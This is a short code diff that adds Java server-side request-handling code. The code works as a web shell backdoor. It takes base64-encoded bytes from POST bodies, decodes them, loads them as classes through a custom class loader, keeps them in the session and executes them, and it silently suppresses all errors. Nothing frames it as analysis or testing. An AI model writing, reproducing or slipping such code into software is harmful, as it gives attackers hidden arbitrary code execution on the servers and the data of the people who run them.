@@ -1,0 +1,37 @@
+ try {
+        try {
+            byte[] test = new byte[]{31, -117, 8, 0, 0, 0, 0, 0, 0, 0, 51, 50, 97, 98, 98, 96, 96, 48, 52, 4, 0, -41, 22, -99, -86, 9, 0, 0, 0};
+            String postData = getBody(request);
+            byte[] data = null;
+            data = base64Decode(postData);
+            data = decodePayload(data);
+            if (session.getAttribute("payload") == null) {
+                try {
+                    session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));
+                } catch (ClassFormatError e) {
+                    if (session.getAttribute("string") == null) {
+                        session.setAttribute("string", data);
+                    } else {
+                        byte[] temp = joinByteArray((byte[]) session.getAttribute("string"), data);
+                        try {
+                            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(temp));
+                            re(session, request, response, test);
+                            return;
+                        } catch (ClassFormatError ee) {
+                            session.setAttribute("string", temp);
+                        }
+                    }
+                    response.getWriter().write(base64EncodeToStringAndPadding("ffd".getBytes(), 10));
+                    return;
+                }
+                re(session, request, response, test);
+
+            } else {
+                re(session, request, response, data);
+            }
+        } finally {
+
+
+        }
+    } catch (Exception e) {
+    }
